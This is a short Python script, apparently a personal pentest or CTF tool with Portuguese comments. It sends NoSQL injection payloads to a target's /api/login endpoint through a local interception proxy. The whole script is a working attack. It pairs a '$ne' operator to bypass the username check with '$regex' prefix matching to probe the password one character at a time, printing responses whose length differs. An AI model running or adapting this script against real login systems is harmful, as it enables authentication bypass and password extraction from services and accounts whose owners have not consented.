import requests
import sys
requests.packages.urllib3.disable_warnings()

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

headers = {
    'Content-Type': 'application/json'
}

url = f"{sys.argv[1]}/api/login"

printables = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' #Coloca digitos e chars minusculos
for char in printables:
	data = {
		'username': {"$ne": None},
		'password': {"$regex":f"^{char}.*"}	
	}
	response = requests.post(url, json=data, headers=headers, proxies=proxies) #Utilizar 'json' para requisicoes json
	tam = len(response.content)
	if tam == 17 or tam == 0:
		continue
	else: 
		print(response.json())